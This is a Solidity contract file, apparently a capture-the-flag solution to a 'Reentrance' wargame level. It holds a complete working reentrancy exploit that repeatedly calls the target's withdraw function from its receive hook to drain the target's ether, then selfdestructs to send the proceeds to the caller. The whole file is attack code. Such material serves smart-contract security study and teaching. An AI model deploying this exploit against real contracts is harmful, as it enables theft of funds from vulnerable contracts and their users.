// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {IReentrance} from "src/test/interfaces/IReentrance.sol";

contract ReentranceHack {
    IReentrance public reentrance;

    constructor(address _reentrance) {
        // Load Reentrance contract instance using interface
        reentrance = IReentrance(_reentrance);
    }

    // Send 0.001 ether and withdraw immediately
    // This will trigger the receive function when withdraw is called on Reentrance contract
    function hack() public payable {
        // Donations will be made against the address of the ReentranceHack contract.
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);

        // Recover sent ether
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 balance = reentrance.balanceOf(address(this));

        // Try to withdraw the smallest amount possible, so that the transaction does not revert
        uint256 withdrawableAmount = balance < 0.001 ether
            ? balance
            : 0.001 ether;

        // Stop withdrawing if the contract balance is 0, so that the transaction does not revert
        if (withdrawableAmount > 0) {
            reentrance.withdraw(withdrawableAmount);
        }
    }
}
